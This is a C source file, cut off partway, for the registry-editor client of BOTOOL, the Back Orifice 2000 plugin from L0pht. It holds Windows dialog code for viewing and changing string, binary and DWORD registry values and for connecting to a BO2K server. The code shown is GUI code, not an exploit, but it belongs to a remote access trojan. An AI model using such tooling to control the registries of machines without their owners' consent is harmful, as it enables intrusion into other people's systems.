/*  BOTOOL - Back Orifice 2000 File System and Registry Browser/Editor
    Copyright (C) 1999, L0pht Heavy Industries, Inc.

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */


#include<windows.h>
#include<commctrl.h>
#include<plugins.h>
#include<bocomreg.h>
#include<auth.h>
#include<iohandler.h>
#include<encryption.h>
#include<config.h>
#include"comm_native.h"
#include"botool.h"
#include<resource.h>
#include<afxres.h>
#include"strhandle.h"
#include"commnet.h"
#include<regedit.h>
#include<regeditfunc.h>

// EditStringDlgProc: Modify a string registry value

BOOL CALLBACK EditStringDlgProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	REGEDIT_CONTEXT *recontext=(REGEDIT_CONTEXT *)GetWindowLong(hwndDlg,GWL_USERDATA);
		
	WORD wID,wNotifyCode;
	HWND hwndCtl;
							
	switch(uMsg) {
	case WM_INITDIALOG:
		SetWindowLong(hwndDlg,GWL_USERDATA,(LONG)lParam);
		// Initialize regedit context
		recontext=(REGEDIT_CONTEXT *)lParam;
		{
			if(recontext->pModRvi->dwType!=REG_SZ &&
				recontext->pModRvi->dwType!=REG_EXPAND_SZ &&
				recontext->pModRvi->dwType!=REG_MULTI_SZ) return FALSE;

			SetDlgItemText(hwndDlg,IDC_VALUENAME,recontext->pModRvi->svName);
			if(recontext->pModRvi->pData!=NULL) {	
				char *svDataStr;
				if(recontext->pModRvi->dwType==REG_MULTI_SZ) {
					svDataStr=(char *)malloc(65536);
					svDataStr[0]='\0';
					char *svStr=(char *)recontext->pModRvi->pData;
					while((*svStr)!='\0') {
						char *svEsc=EscapeString(svStr);
						lstrcat(svDataStr,svEsc);
						free(svEsc);
						svStr+=(lstrlen(svStr)+1);
					}
				} else {
					svDataStr=EscapeString((char *)(recontext->pModRvi->pData));
				}
				SetDlgItemText(hwndDlg,IDC_VALUEDATA,svDataStr);
				free(svDataStr);
			} else {
				SetDlgItemText(hwndDlg,IDC_VALUEDATA,"");
			}
		}
		
		return TRUE;
	case WM_CLOSE:
		PostQuitMessage(0);
		return TRUE;
	case WM_COMMAND:
		wNotifyCode = HIWORD(wParam); // notification code 
		wID = LOWORD(wParam);         // item, control, or accelerator identifier 
		hwndCtl = (HWND) lParam;      // handle of control 
		switch(wID) {
		case IDOK:
			{
				char *svDataStr;
				int dwDataLen;
				if(recontext->pModRvi->dwType==REG_MULTI_SZ) {
					svDataStr=(char *)malloc(65536);
					GetDlgItemText(hwndDlg,IDC_VALUEDATA,svDataStr,65535);
					if(lstrlen(svDataStr)<2) {
						MessageBox(hwndDlg,"MULTI_SZ strings must end with a \\0 character.","Value data error",MB_OK|MB_TOPMOST|MB_SETFOREGROUND|MB_ICONSTOP);
						break;
					}
					if(lstrcmp(svDataStr+lstrlen(svDataStr)-2,"\\0")!=0) {
						MessageBox(hwndDlg,"MULTI_SZ strings must end with a \\0 character.","Value data error",MB_OK|MB_TOPMOST|MB_SETFOREGROUND|MB_ICONSTOP);
						break;
					}
					
					UnescapeString(svDataStr);
					
					char *svPtr=svDataStr;
					dwDataLen=0;
					while((*svPtr)!='\0') {
						dwDataLen+=(lstrlen(svPtr)+1);
						svPtr+=(lstrlen(svPtr)+1);
					}
				} else {
					svDataStr=(char *)malloc(65536);
					GetDlgItemText(hwndDlg,IDC_VALUEDATA,svDataStr,65535);
					UnescapeString(svDataStr);
					dwDataLen=lstrlen(svDataStr)+1;
				}
			
				recontext->pNewData=svDataStr;
				recontext->dwNewDataLen=dwDataLen;

				EndDialog(hwndDlg,IDOK);
			}
			break;
		case IDCANCEL:
			EndDialog(hwndDlg,IDCANCEL);
			break;
		}	
		return TRUE;
	case WM_DESTROY:	
		return TRUE;
	}

	return FALSE;
}

// HexeditWndProc: Catches edit control and makes it to do hex data
#define WM_USER_SETDATA (WM_USER+105)
BOOL CALLBACK HexeditWndProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
//	int nCmd;
		
	switch(uMsg) {
	case WM_RBUTTONDOWN:
		return TRUE;
	case WM_RBUTTONUP:
		return TRUE;
	case WM_CHAR:
		return TRUE;
	case WM_KEYDOWN:
		return TRUE;
	case WM_KEYUP:
		return TRUE;
	case WM_USER_SETDATA:
		{
			DWORD dw,dwDataLen=(DWORD)wParam;
			BYTE *pData=(BYTE *)lParam;

			char c,svChr[3],*svCur,*svData=(char *)malloc(32*(wParam+1));
			svCur=svData;
			svData[0]='\0';
				
			dw=0;
			do {
				if((dw % 8)==0) {
					wsprintf(svCur,"%4.4X                                   ",dw);
				}
				if(dw<dwDataLen) {
					wsprintf(svChr,"%2.2X", pData[dw]);
					memcpy(svCur+6+(3*(dw%8)),svChr,2);
					c=pData[dw];
					if(c<32) c='.';
					svCur[32+(dw%8)]=c;
				}
				if((dw % 8)==7) {
					lstrcat(svData,"\r\n");
					svCur+=lstrlen(svCur);
				}
				dw++;
			} while(dw<=dwDataLen);

			CallWindowProc((WNDPROC)GetWindowLong(hwndDlg,GWL_USERDATA),hwndDlg,WM_SETTEXT,0,(LPARAM)svData);
			free(svData);
		}
		return TRUE;
	}

	return CallWindowProc((WNDPROC)GetWindowLong(hwndDlg,GWL_USERDATA),hwndDlg,uMsg,wParam,lParam);
}

// EditBinaryDlgProc: Modify a binary reg value

BOOL CALLBACK EditBinaryDlgProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	REGEDIT_CONTEXT *recontext=(REGEDIT_CONTEXT *)GetWindowLong(hwndDlg,GWL_USERDATA);
		
	WORD wID,wNotifyCode;
	HWND hwndCtl;
							
	switch(uMsg) {
	case WM_INITDIALOG:
		{
			// Initialize regedit context
			SetWindowLong(hwndDlg,GWL_USERDATA,(LONG)lParam);
			recontext=(REGEDIT_CONTEXT *)lParam;
		
			SetDlgItemText(hwndDlg,IDC_VALUENAME,recontext->pModRvi->svName);
			
			recontext->hFont=CreateFont(
				-MulDiv(10, GetDeviceCaps(GetDC(NULL), LOGPIXELSY), 72),
				0,0,0,FW_NORMAL,FALSE,FALSE,FALSE,ANSI_CHARSET,OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,PROOF_QUALITY,FIXED_PITCH|FF_DONTCARE,"Courier New");
			
			SendDlgItemMessage(hwndDlg,IDC_VALUEDATA,WM_SETFONT,(WPARAM)recontext->hFont,MAKELPARAM(TRUE,0));
			
			// Subclass edit control
			HWND hEdit=GetDlgItem(hwndDlg,IDC_VALUEDATA);
			SetWindowLong(hEdit,GWL_USERDATA,GetWindowLong(hEdit,GWL_WNDPROC));
			SetWindowLong(hEdit,GWL_WNDPROC,(DWORD)HexeditWndProc);

			// Fill edit control
			SendMessage(hEdit,WM_USER_SETDATA,(WPARAM)recontext->pModRvi->dwDataLen,(LPARAM)recontext->pModRvi->pData);
		}
		return TRUE;
	case WM_CLOSE:
		PostQuitMessage(0);
		return TRUE;
	case WM_COMMAND:
		wNotifyCode = HIWORD(wParam); // notification code 
		wID = LOWORD(wParam);         // item, control, or accelerator identifier 
		hwndCtl = (HWND) lParam;      // handle of control 
		switch(wID) {
		case IDOK:

			EndDialog(hwndDlg,IDOK);
			break;
		case IDCANCEL:
			EndDialog(hwndDlg,IDCANCEL);
			break;
		}	
		return TRUE;
	case WM_DESTROY:	
		DeleteObject(recontext->hFont);
		{
			// Unsubclass edit control
			HWND hEdit=GetDlgItem(hwndDlg,IDC_VALUEDATA);
			SetWindowLong(hEdit,GWL_WNDPROC,GetWindowLong(hEdit,GWL_USERDATA));
		}
		return TRUE;
	}

	return FALSE;
}

BOOL CALLBACK SuckyEditBinaryDlgProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	REGEDIT_CONTEXT *recontext=(REGEDIT_CONTEXT *)GetWindowLong(hwndDlg,GWL_USERDATA);
		
	WORD wID,wNotifyCode;
	HWND hwndCtl;
							
	switch(uMsg) {
	case WM_INITDIALOG:
		SetWindowLong(hwndDlg,GWL_USERDATA,(LONG)lParam);
		// Initialize regedit context
		recontext=(REGEDIT_CONTEXT *)lParam;
		// Fill shit in
		{
			SetDlgItemText(hwndDlg,IDC_VALUENAME,recontext->pModRvi->svName);
			if(recontext->pModRvi->pData!=NULL) {
				DWORD dw;
				DWORD dwDataLen=recontext->pModRvi->dwDataLen;
				BYTE *pData=(BYTE *)(recontext->pModRvi->pData);
				char svChr[4],*svDataStr=(char *)malloc(dwDataLen*3+1);
				svDataStr[0]='\0';
				for(dw=0;dw<dwDataLen;dw++) {
					if(dw<(dwDataLen-1)) {
						wsprintf(svChr,"%2.2X ",pData[dw]);
					} else {
						wsprintf(svChr,"%2.2X",pData[dw]);
					}
					lstrcat(svDataStr,svChr);
				}
				SetDlgItemText(hwndDlg,IDC_VALUEDATA,svDataStr);
				free(svDataStr);
			} else {
				SetDlgItemText(hwndDlg,IDC_VALUEDATA,"");
			}
		}
		
		return TRUE;
	case WM_CLOSE:
		PostQuitMessage(0);
		return TRUE;
	case WM_COMMAND:
		wNotifyCode = HIWORD(wParam); // notification code 
		wID = LOWORD(wParam);         // item, control, or accelerator identifier 
		hwndCtl = (HWND) lParam;      // handle of control 
		switch(wID) {
		case IDOK:
			{
				char *svChr,*svDataStr;
				svDataStr=(char *)malloc(65536);
				
				BYTE *pNewData=(BYTE *)malloc(65536);
				DWORD dwDataLen=0;
				
				GetDlgItemText(hwndDlg,IDC_VALUEDATA,svDataStr,65535);
				svChr=svDataStr;
				while((*svChr)==' ') svChr++;
	
				while((*svChr)!='\0') {
					char c=*svChr;
					BYTE b=0;
					while(c!='\0' && c!=' ') {
						b<<=4;
						if(c>='0' && c<='9') b+=(c-'0');
						else if(c>='A' && c<='F') b+=(c-'A'+10);
						else if(c>='a' && c<='f') b+=(c-'a'+10);

						svChr++;
						c=*svChr;
					}
					pNewData[dwDataLen]=b;
					dwDataLen++;
				
					if((*svChr)!='\0') svChr++;
					while((*svChr)==' ') svChr++;
				}

				free(svDataStr);
				recontext->pNewData=pNewData;
				recontext->dwNewDataLen=dwDataLen;

				EndDialog(hwndDlg,IDOK);
			}
			break;
		case IDCANCEL:
			EndDialog(hwndDlg,IDCANCEL);
			break;
		}	
		return TRUE;
	case WM_DESTROY:	
		return TRUE;
	}

	return FALSE;
}


// EditDWORDDlgProc: Modify a DWORD registry value

BOOL CALLBACK EditDWORDDlgProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	REGEDIT_CONTEXT *recontext=(REGEDIT_CONTEXT *)GetWindowLong(hwndDlg,GWL_USERDATA);
		
	WORD wID,wNotifyCode;
	HWND hwndCtl;
							
	switch(uMsg) {
	case WM_INITDIALOG:
		SetWindowLong(hwndDlg,GWL_USERDATA,(LONG)lParam);
		// Initialize regedit context
		recontext=(REGEDIT_CONTEXT *)lParam;
		{
			if(recontext->pModRvi->dwType!=REG_DWORD) return FALSE;

			SetDlgItemText(hwndDlg,IDC_VALUENAME,recontext->pModRvi->svName);
			if(recontext->pModRvi->pData!=NULL) {	
				SetDlgItemInt(hwndDlg,IDC_VALUEDATA,*(DWORD *)(recontext->pModRvi->pData),FALSE);
			} else {
				SetDlgItemText(hwndDlg,IDC_VALUEDATA,"");
			}
			recontext->bHex=FALSE;
			CheckRadioButton(hwndDlg,IDC_BASE_HEX,IDC_BASE_DEC,IDC_BASE_DEC);
		}
		
		return TRUE;
	case WM_CLOSE:
		PostQuitMessage(0);
		return TRUE;
	case WM_COMMAND:
		wNotifyCode = HIWORD(wParam); // notification code 
		wID = LOWORD(wParam);         // item, control, or accelerator identifier 
		hwndCtl = (HWND) lParam;      // handle of control 
		switch(wID) {
		case IDOK:
			{
				DWORD *pNewData;
				int dwNewDataLen;
				
				pNewData=(DWORD *)malloc(sizeof(DWORD));
				dwNewDataLen=sizeof(DWORD);

				if(recontext->bHex) {
					DWORD dwValue=0;
					char svDataStr[256],*svStr;
				
					GetDlgItemText(hwndDlg,IDC_VALUEDATA,svDataStr,255);
				
					svStr=svDataStr;
					while((*svStr)!='\0') {
						char c=*svStr;
						dwValue<<=4;
						if(c>='0' && c<='9') dwValue+=(c-'0');
						else if(c>='A' && c<='F') dwValue+=(c-'A'+10);
						else if(c>='a' && c<='f') dwValue+=(c-'a'+10);
						svStr++;
					}
				
					*pNewData=dwValue;
				} else {
					*pNewData=GetDlgItemInt(hwndDlg,IDC_VALUEDATA,NULL,FALSE);
				}
				
				recontext->pNewData=pNewData;
				recontext->dwNewDataLen=dwNewDataLen;

			}
			EndDialog(hwndDlg,IDOK);
			break;
		case IDCANCEL:
			EndDialog(hwndDlg,IDCANCEL);
			break;
		case IDC_BASE_HEX:
			if(recontext->bHex) return TRUE;
			{
				DWORD dwValue=GetDlgItemInt(hwndDlg,IDC_VALUEDATA,NULL,FALSE);
				char svValue[256];
				wsprintf(svValue,"%x",dwValue);
				SetDlgItemText(hwndDlg,IDC_VALUEDATA,svValue);
				recontext->bHex=TRUE;
			}
			break;
		case IDC_BASE_DEC:
			if(!recontext->bHex) return TRUE;
			{
				DWORD dwValue=0;
				char svValue[256],*svStr;
				GetDlgItemText(hwndDlg,IDC_VALUEDATA,svValue,255);

				svStr=svValue;
				while((*svStr)!='\0') {
					char c=*svStr;
					dwValue<<=4;
					if(c>='0' && c<='9') dwValue+=(c-'0');
					else if(c>='A' && c<='F') dwValue+=(c-'A'+10);
					else if(c>='a' && c<='f') dwValue+=(c-'a'+10);
					svStr++;
				}
				
				SetDlgItemInt(hwndDlg,IDC_VALUEDATA,dwValue,FALSE);
				recontext->bHex=FALSE;
			}
			
			break;
		}
		return TRUE;
	case WM_DESTROY:	
		return TRUE;
	}

	return FALSE;
}






// NewKeyDlgProc: Asks the user for a new key name to create

BOOL CALLBACK NewKeyDlgProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	REGEDIT_CONTEXT *recontext=(REGEDIT_CONTEXT *)GetWindowLong(hwndDlg,GWL_USERDATA);
		
	WORD wID,wNotifyCode;
	HWND hwndCtl;
							
	switch(uMsg){
	case WM_INITDIALOG:
		SetWindowLong(hwndDlg,GWL_USERDATA,(LONG)lParam);
		// Initialize regedit context
		recontext=(REGEDIT_CONTEXT *)lParam;
		
		return TRUE;
	case WM_CLOSE:
		PostQuitMessage(0);
		return TRUE;
	case WM_COMMAND:
		wNotifyCode = HIWORD(wParam); // notification code 
		wID = LOWORD(wParam);         // item, control, or accelerator identifier 
		hwndCtl = (HWND) lParam;      // handle of control 
		switch(wID) {
		case IDOK:
			GetDlgItemText(hwndDlg,IDC_KEYNAME,recontext->svKeyName,260);
			EndDialog(hwndDlg,IDOK);
			break;
		case IDCANCEL:
			recontext->svKeyName[0]='\0';
			EndDialog(hwndDlg,IDCANCEL);
			break;
		}	
		return TRUE;
	case WM_DESTROY:	
		return TRUE;
	}

	return FALSE;
}


// RegListViewProc: Catches list view right click to do popup menu

BOOL CALLBACK RegListViewProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	HMENU hm,hmenu;
	POINT pt;
	int nCmd;
		
	switch(uMsg) {
	case WM_RBUTTONDOWN:
		CallWindowProc((WNDPROC)GetWindowLong(hwndDlg,GWL_USERDATA),hwndDlg,WM_RBUTTONDOWN,wParam,lParam);
		CallWindowProc((WNDPROC)GetWindowLong(hwndDlg,GWL_USERDATA),hwndDlg,WM_RBUTTONUP,wParam,lParam);

		hm=LoadMenu(g_hInstance,MAKEINTRESOURCE(IDR_REGVALUEPOPUP));
		hmenu=GetSubMenu(hm,0);
		GetCursorPos(&pt);
		nCmd=TrackPopupMenu(hmenu,TPM_RETURNCMD|TPM_RIGHTBUTTON,pt.x,pt.y,0,GetParent(hwndDlg),NULL);
		if(nCmd>0) {
			SendMessage(GetParent(hwndDlg),WM_COMMAND,MAKEWPARAM(nCmd,0),NULL);
		}
		DestroyMenu(hm);			
		return TRUE;
	case WM_RBUTTONUP:

		return TRUE;
	}

	return CallWindowProc((WNDPROC)GetWindowLong(hwndDlg,GWL_USERDATA),hwndDlg,uMsg,wParam,lParam);
}

// RegTreeViewProc: Catches list view right click to do popup menu

BOOL CALLBACK RegTreeViewProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	HMENU hm,hmenu;
	POINT pt;
	int nCmd;
		
	switch(uMsg) {
	case WM_RBUTTONDOWN:
		CallWindowProc((WNDPROC)GetWindowLong(hwndDlg,GWL_USERDATA),hwndDlg,WM_LBUTTONDOWN,wParam,lParam);
		CallWindowProc((WNDPROC)GetWindowLong(hwndDlg,GWL_USERDATA),hwndDlg,WM_LBUTTONUP,wParam,lParam);
		CallWindowProc((WNDPROC)GetWindowLong(hwndDlg,GWL_USERDATA),hwndDlg,WM_RBUTTONDOWN,wParam,lParam);

		hm=LoadMenu(g_hInstance,MAKEINTRESOURCE(IDR_REGKEYPOPUP));
		hmenu=GetSubMenu(hm,0);
		GetCursorPos(&pt);
		nCmd=TrackPopupMenu(hmenu,TPM_RETURNCMD|TPM_RIGHTBUTTON,pt.x,pt.y,0,GetParent(hwndDlg),NULL);
		if(nCmd>0) {
			SendMessage(GetParent(hwndDlg),WM_COMMAND,MAKEWPARAM(nCmd,0),NULL);
		}
		DestroyMenu(hm);
		CallWindowProc((WNDPROC)GetWindowLong(hwndDlg,GWL_USERDATA),hwndDlg,WM_RBUTTONUP,wParam,lParam);
		return TRUE;
	case WM_RBUTTONUP:

		return TRUE;
	}

	return CallWindowProc((WNDPROC)GetWindowLong(hwndDlg,GWL_USERDATA),hwndDlg,uMsg,wParam,lParam);
}


// RegeditDlgProc: Dialog Procedure for Registry editor client

BOOL CALLBACK RegeditDlgProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	REGEDIT_CONTEXT *recontext=(REGEDIT_CONTEXT *)GetWindowLong(hwndDlg,GWL_USERDATA);
		
	WORD wID,wNotifyCode;
	HWND hwndCtl;
							
	switch(uMsg) {
	case WM_INITDIALOG:
		SetWindowLong(hwndDlg,GWL_USERDATA,(LONG)lParam);
		
		// Initialize regedit context
		recontext=(REGEDIT_CONTEXT *)lParam;
		recontext->hDialog=hwndDlg;
	
		// Misc
		recontext->pSock=NULL;
		recontext->svAddress[0]='\0';
		recontext->bEnter=TRUE;

		// Load icons
		recontext->hLargeIcon=(HICON)LoadImage(g_hInstance,MAKEINTRESOURCE(IDI_CDCREG),IMAGE_ICON,32,32,0);
		recontext->hSmallIcon=(HICON)LoadImage(g_hInstance,MAKEINTRESOURCE(IDI_CDCREG),IMAGE_ICON,16,16,0);

		// Load image list
		recontext->hImageList=(HIMAGELIST)ImageList_LoadImage(g_hInstance,MAKEINTRESOURCE(IDB_REGIMGLIST),16,1,RGB(255,0,255),IMAGE_BITMAP,LR_LOADTRANSPARENT);

		// Set icons
		SendMessage(hwndDlg,WM_SETICON,ICON_BIG,(LPARAM)recontext->hLargeIcon);
		SendMessage(hwndDlg,WM_SETICON,ICON_SMALL,(LPARAM)recontext->hSmallIcon);
		
		// Set menu
		recontext->hDlgMenu=LoadMenu(g_hInstance,MAKEINTRESOURCE(IDR_REGEDITMENU));
		SetMenu(hwndDlg,recontext->hDlgMenu);
		DrawMenuBar(hwndDlg);

		// Add listview columns
		{
			HWND hlv=GetDlgItem(hwndDlg,IDC_REGLIST);
			LVCOLUMN lvc;
			lvc.mask=LVCF_FMT|LVCF_WIDTH|LVCF_TEXT|LVCF_ORDER|LVCF_SUBITEM;
			lvc.fmt=LVCFMT_LEFT;
			lvc.cx=100;
			lvc.pszText="Name";
			lvc.iSubItem=2;
			lvc.iOrder=2;
			ListView_InsertColumn(hlv,0,&lvc);
	
			lvc.mask=LVCF_FMT|LVCF_WIDTH|LVCF_TEXT|LVCF_ORDER|LVCF_SUBITEM;
			lvc.fmt=LVCFMT_LEFT;
			lvc.cx=300;
			lvc.pszText="Data";			
			lvc.iSubItem=2;
			lvc.iOrder=2;
			ListView_InsertColumn(hlv,1,&lvc);
		}
		
		// Set image lists
		ListView_SetImageList(GetDlgItem(hwndDlg,IDC_REGLIST),recontext->hImageList,LVSIL_SMALL);
		TreeView_SetImageList(GetDlgItem(hwndDlg,IDC_REGTREE),recontext->hImageList,TVSIL_NORMAL);

		// Create Status Bar
		recontext->hStatus=CreateStatusWindow(WS_VISIBLE|WS_CHILD,"Disconnected",hwndDlg,IDC_STATUS);

		// Disable items since we're not connected
		SendMessage(recontext->hDialog,WM_ENABLEITEMS,0,FALSE);

		// Subclass list view
		HWND hw;
		hw=GetDlgItem(recontext->hDialog,IDC_REGLIST);
		SetWindowLong(hw,GWL_USERDATA,GetWindowLong(hw,GWL_WNDPROC));
		SetWindowLong(hw,GWL_WNDPROC,(LONG)RegListViewProc);

		// Subclass tree view
		hw=GetDlgItem(recontext->hDialog,IDC_REGTREE);
		SetWindowLong(hw,GWL_USERDATA,GetWindowLong(hw,GWL_WNDPROC));
		SetWindowLong(hw,GWL_WNDPROC,(LONG)RegTreeViewProc);

		return TRUE;

	case WM_ENABLEITEMS:
		{
			EnableWindow(GetDlgItem(hwndDlg,IDC_REGTREE),lParam);
			EnableWindow(GetDlgItem(hwndDlg,IDC_REGLIST),lParam);
			HMENU mnu;
			mnu=GetMenu(hwndDlg);
			EnableMenuItem(mnu,IDM_NEW_KEY,lParam?MF_ENABLED:MF_GRAYED);
			EnableMenuItem(mnu,IDM_NEW_STRINGVALUE,lParam?MF_ENABLED:MF_GRAYED);
			EnableMenuItem(mnu,IDM_NEW_BINARYVALUE,lParam?MF_ENABLED:MF_GRAYED);
			EnableMenuItem(mnu,IDM_NEW_DWORDVALUE,lParam?MF_ENABLED:MF_GRAYED);
			EnableMenuItem(mnu,IDM_DELETE_KEY,lParam?MF_ENABLED:MF_GRAYED);
			EnableMenuItem(mnu,IDM_RENAME_KEY,lParam?MF_ENABLED:MF_GRAYED);
			EnableMenuItem(mnu,IDM_COPYKEYNAME,lParam?MF_ENABLED:MF_GRAYED);
			EnableMenuItem(mnu,IDM_DISCONNECT,lParam?MF_ENABLED:MF_GRAYED);
			EnableMenuItem(mnu,IDM_CONNECT,!lParam?MF_ENABLED:MF_GRAYED);
		}
		return TRUE;
		

	case WM_CLOSE:
		PostQuitMessage(0);
		return TRUE;

	case WM_WINDOWPOSCHANGED:
		{
			LPWINDOWPOS lpwp=(LPWINDOWPOS)lParam;
			if(((lpwp->flags & SWP_NOSIZE)==0) || (IsWindowVisible(hwndDlg)==FALSE)) {
				int width=lpwp->cx-(GetSystemMetrics(SM_CXSIZEFRAME)*2);
				int height=lpwp->cy-(GetSystemMetrics(SM_CYSIZEFRAME)*2)-GetSystemMetrics(SM_CYMENU)-GetSystemMetrics(SM_CYCAPTION);
				SetWindowPos(GetDlgItem(hwndDlg,IDC_REGTREE),NULL,0,4,width/2-3,height-24,SWP_NOZORDER|SWP_NOREPOSITION|SWP_NOREDRAW);
				SetWindowPos(GetDlgItem(hwndDlg,IDC_REGLIST),NULL,width/2+2,4,width/2-1,height-24,SWP_NOZORDER|SWP_NOREPOSITION|SWP_NOREDRAW);
				SetWindowPos(GetDlgItem(hwndDlg,IDC_STATUS),NULL,1,height-44,width-4,16,SWP_NOZORDER|SWP_NOREPOSITION|SWP_NOREDRAW);
				InvalidateRect(hwndDlg,NULL,TRUE);
				return TRUE;
			} 
		}
		return FALSE;
	case WM_NOTIFY:
		{
			int idCtrl = (int) wParam;
			LPNMHDR pnmh = (LPNMHDR) lParam;
			
			switch(pnmh->code)
			{
			case TVN_KEYDOWN:
				{
					NMTVKEYDOWN *pnmtvkd=(NMTVKEYDOWN *)lParam;
					if(pnmtvkd->wVKey==VK_DELETE) {
						SendMessage(hwndDlg,WM_COMMAND,MAKEWPARAM(IDM_DELETE_KEY,1),NULL);
					}
				}
				SetWindowLong(hwndDlg,DWL_MSGRESULT,0);
				return TRUE;
			case LVN_KEYDOWN:
				{
					NMLVKEYDOWN *pnmlvkd=(NMLVKEYDOWN *)lParam;
					if(pnmlvkd->wVKey==VK_DELETE) {
						SendMessage(hwndDlg,WM_COMMAND,MAKEWPARAM(IDM_DELETE_KEY,1),NULL);
					}
				}
				SetWindowLong(hwndDlg,DWL_MSGRESULT,0);
				return TRUE;

			case TVN_ITEMEXPANDING:
				if(recontext->pSock!=NULL) {
					NMTREEVIEW *pnmtv=(NMTREEVIEW *)lParam;
					if(pnmtv->action==TVE_EXPAND) {
						ExpandKey(recontext,pnmh->hwndFrom,pnmtv->itemNew.hItem);
					} else if(pnmtv->action==TVE_COLLAPSE) {
						CollapseKey(recontext,pnmh->hwndFrom,pnmtv->itemNew.hItem);
						SelectKey(recontext,pnmh->hwndFrom,pnmtv->itemNew.hItem,GetDlgItem(hwndDlg,IDC_REGLIST));
					}
				}
				SetWindowLong(hwndDlg,DWL_MSGRESULT,FALSE);
				return TRUE;

			case TVN_SELCHANGING:
				if(recontext->pSock!=NULL) {
					NMTREEVIEW *pnmtv=(NMTREEVIEW *)lParam;
					SelectKey(recontext,pnmh->hwndFrom,pnmtv->itemNew.hItem,GetDlgItem(hwndDlg,IDC_REGLIST));
				}
				SetWindowLong(hwndDlg,DWL_MSGRESULT,FALSE);
				return TRUE;

			case NM_DBLCLK:
				if(pnmh->hwndFrom==GetDlgItem(hwndDlg,IDC_REGLIST)) {
					HWND hlv=GetDlgItem(hwndDlg,IDC_REGLIST);
					if(ListView_GetNextItem(hlv,-1,LVNI_FOCUSED)!=-1) {
						SendMessage(hwndDlg,WM_COMMAND,MAKEWPARAM(IDM_MODIFY_VALUE,1),NULL);
					}
				}
				return TRUE;

			case LVN_BEGINLABELEDIT:
				if(pnmh->hwndFrom==GetDlgItem(hwndDlg,IDC_REGLIST)) {
					SetWindowLong(hwndDlg,DWL_MSGRESULT,FALSE);
					return TRUE;
				}
				SetWindowLong(hwndDlg,DWL_MSGRESULT,TRUE);
				return TRUE;

			case LVN_ENDLABELEDIT:
				if(pnmh->hwndFrom==GetDlgItem(hwndDlg,IDC_REGLIST)) {
					NMLVDISPINFO *nmlvdi=(NMLVDISPINFO *)lParam;
					HWND hlv=GetDlgItem(hwndDlg,IDC_REGLIST);
					HWND htv=GetDlgItem(hwndDlg,IDC_REGTREE);
					if(nmlvdi->item.pszText!=NULL) {
						LVITEM lvi;
						char svOldValue[260];
						lvi.mask=LVIF_TEXT|LVIF_PARAM;
						lvi.iItem=nmlvdi->item.iItem;
						lvi.iSubItem=nmlvdi->item.iSubItem;
						lvi.pszText=svOldValue;
						lvi.cchTextMax=260;
						ListView_GetItem(hlv,&lvi);
						REGVALUE_INFO *rvi=(REGVALUE_INFO *)lvi.lParam;
						
						if(RenameValue(recontext,htv, TreeView_GetSelection(htv), svOldValue, nmlvdi->item.pszText)) {
							lstrcpyn(rvi->svName,nmlvdi->item.pszText,260);
							SetWindowLong(hwndDlg,DWL_MSGRESULT,TRUE);
							return TRUE;
						}
					}
				}
				SetWindowLong(hwndDlg,DWL_MSGRESULT,FALSE);
				return TRUE;

			case TVN_BEGINLABELEDIT:
				if(pnmh->hwndFrom==GetDlgItem(hwndDlg,IDC_REGTREE)) {
					SetWindowLong(hwndDlg,DWL_MSGRESULT,FALSE);
					return TRUE;
				}
				SetWindowLong(hwndDlg,DWL_MSGRESULT,TRUE);
				return TRUE;

			case TVN_ENDLABELEDIT:
				if(pnmh->hwndFrom==GetDlgItem(hwndDlg,IDC_REGTREE)) {
					NMTVDISPINFO *nmtvdi=(NMTVDISPINFO *)lParam;
					HWND htv=GetDlgItem(hwndDlg,IDC_REGTREE);
					if(nmtvdi->item.pszText!=NULL) {
						if(RenameKey(recontext,htv,nmtvdi->item)) {
							SetWindowLong(hwndDlg,DWL_MSGRESULT,TRUE);
							return TRUE;
						}
					}
				}
				SetWindowLong(hwndDlg,DWL_MSGRESULT,FALSE);
				return FALSE;
			}
		}
		return FALSE;

	case WM_COMMAND:
		wNotifyCode = HIWORD(wParam); // notification code 
		wID = LOWORD(wParam);         // item, control, or accelerator identifier 
		hwndCtl = (HWND) lParam;      // handle of control 
		switch(wID) {
		case IDM_COPYKEYNAME:
			{
				HWND htv=GetDlgItem(recontext->hDialog,IDC_REGTREE);	
				HTREEITEM hti=TreeView_GetSelection(htv);
				CopyKeyName(recontext,htv,hti);
			}
			return TRUE;
		case ID_VIEW_REFRESH:
			if(recontext->pSock!=NULL) {
				HWND htv=GetDlgItem(recontext->hDialog,IDC_REGTREE);	
				HWND hlv=GetDlgItem(recontext->hDialog,IDC_REGLIST);	
				HTREEITEM hti=TreeView_GetSelection(htv);
				
				SelectKey(recontext, htv, hti, hlv);
			}
			InvalidateRect(recontext->hDialog,NULL,TRUE);
			return TRUE;
		case IDM_CONNECT:
		case IDM_DISCONNECT:
			if(recontext->pSock==NULL) {
				if(RegeditConnect(recontext)==-1) {
					MessageBox(recontext->hDialog,"Could not connect to server.\n","Connection error",MB_OK|MB_SETFOREGROUND|MB_TOPMOST|MB_ICONWARNING);	
				}
			} else {
				RegeditDisconnect(recontext);
			}
			return TRUE;
		case IDM_CLOSE:
			SendMessage(recontext->hDialog,WM_CLOSE,0,0);
			return TRUE;
		case IDM_RENAME_KEY:
			{
				int i,count;
				HWND htv=GetDlgItem(recontext->hDialog,IDC_REGTREE);
				HWND hlv=GetDlgItem(recontext->hDialog,IDC_REGLIST);
